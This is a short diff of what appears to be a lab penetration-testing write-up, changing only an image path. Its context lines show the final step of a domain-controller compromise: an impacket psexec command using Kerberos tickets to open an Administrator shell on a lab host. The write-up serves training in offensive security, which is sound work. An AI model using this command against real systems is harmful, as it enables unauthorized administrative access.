@@ -406,4 +406,4 @@ Lastly, we can psexec into the target machine as the Administrator:
 python3 psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.81.175
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
